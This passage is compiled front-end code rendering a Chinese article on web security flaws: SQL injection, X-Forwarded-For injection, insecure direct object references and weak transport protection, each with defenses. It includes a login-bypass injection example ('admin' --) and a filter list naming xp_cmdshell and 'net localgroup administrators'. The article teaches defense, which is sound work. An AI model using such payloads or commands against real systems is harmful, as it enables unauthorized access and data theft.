keyword"}},[s._v("SELECT")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("FROM")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("user")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("WHERE")]),s._v(" username"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'admin'")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-- AND psw='${pwd}'")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("⭐️Ps: "),e("code",[s._v("--")]),s._v(" 在SQL语句里面是注释，也就是说登录的查询条件变成了不需要验证密码！")]),s._v(" "),e("h3",{attrs:{id:"sql注入防御"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#sql注入防御"}},[s._v("#")]),s._v(" SQL注入防御")]),s._v(" "),e("ol",[e("li",[s._v('永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双"-"进行转换等。')]),s._v(" "),e("li",[s._v("永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。")]),s._v(" "),e("li",[s._v("永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。")]),s._v(" "),e("li",[s._v("不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。")]),s._v(" "),e("li",[s._v("应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装")]),s._v(" "),e("li",[s._v("sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。")])]),s._v(" "),e("h2",{attrs:{id:"四、xff注入"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#四、xff注入"}},[s._v("#")]),s._v(" 四、XFF注入")]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),e("p",[s._v("X-Forwarded-for的缩写，XFF注入是SQL注入的一种，该注入原理是通过修改X-Forwarded-for头对带入系统的dns进行sql注入，从而得到网站的数据库内容。")])]),s._v(" "),e("h3",{attrs:{id:"xff的预防"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#xff的预防"}},[s._v("#")]),s._v(" XFF的预防")]),s._v(" "),e("ol",[e("li",[e("p",[s._v("过滤http头中的X-Forwarded-for header中的内容，不允许其插入敏感字符，过滤字符参考sql注入修复方案。")])]),s._v(" "),e("li",[e("p",[s._v("过滤以下敏感字符。需要过滤的特殊字符及字符串有：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("net user\nxp_cmdshell\nadd\nexec master.dbo.xp_cmdshell\nnet localgroup administrators\nselect\ncount\nAsc\nchar\nmid\n'\n：\n\"\ninsert\ndelete from\ndrop table\nupdate\ntruncate\nfrom\n%\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br")])])])]),s._v(" "),e("h2",{attrs:{id:"五、不安全的直接对象引用"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#五、不安全的直接对象引用"}},[s._v("#")]),s._v(" 五、不安全的直接对象引用")]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),e("p",[s._v("当开发人员公开对内部实现对象的引用（例如URL或FORM参数中的文件，目录或数据库键）时，就会发生这种情况。攻击者可以使用此信息访问其他对象，并可以创建将来的攻击来访问未经授权的数据。")])]),s._v(" "),e("p",[e("strong",[s._v("简单举例：")]),s._v(" 更改以下URL中的 "),e("code",[s._v("userid")]),s._v(" 可以使攻击者查看其他用户的信息。 "),e("code",[s._v("http://www.jsay.org/userid=123")]),s._v(" 修改为 "),e("code",[s._v("http://www.jsay.org/userid=124")]),s._v(" 攻击者可以通过更改用户标识值来查看其他信息。或者文件允许下载访问  "),e("code",[s._v("http://www.jsay.org/a.txt")]),s._v(" ，但是通过 "),e("code",[s._v("http://www.jsay.org/b.txt")]),s._v(" 可以看到不允许访问的文件！")]),s._v(" "),e("h3",{attrs:{id:"防御"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#防御"}},[s._v("#")]),s._v(" 防御")]),s._v(" "),e("ol",[e("li",[s._v("实施访问控制检查。")]),s._v(" "),e("li",[s._v("避免在URL中公开对象引用。")]),s._v(" "),e("li",[s._v("验证对所有引用对象的授权。")])]),s._v(" "),e("h2",{attrs:{id:"六、传输层保护不足"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#六、传输层保护不足"}},[s._v("#")]),s._v(" 六、传输层保护不足")]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),e("p",[s._v("处理用户（客户端）和服务器（应用程序）之间的信息交换。应用程序经常通过网络传输敏感信息，如身份验证详细信息，信用卡信息和会话令牌。通过使用弱算法或使用过期或无效的证书或不使用SSL，可以允许将通信暴露给不受信任的用户，这可能会危及Web应用程序和/或窃取敏感信息。")])]),s._v(" "),e("h3",{attrs:{id:"防御-2"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#防御-2"}},[s._v("#")]),s._v(" 防御")]),s._v(" "),e("ol",[e("li",[s._v("启用安全HTTP并仅通过HTTPS强制执行凭据传输。")]),s._v(" "),e("li",[s._v("确保您的证书有效且未过期。")])]),s._v(" "),e("p",[s._v("作者：拾贰")]),s._v(" "),e("p",[s._v("链接：https://juejin.im/post/5cda5f295188257ec35efd86")]),s._v(" "),e("p",[s._v("来源：掘金")]),s._v(" "),e("p",[s._v("著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。")])])}),[],!1,null,null,null);t.default=r.exports}}]);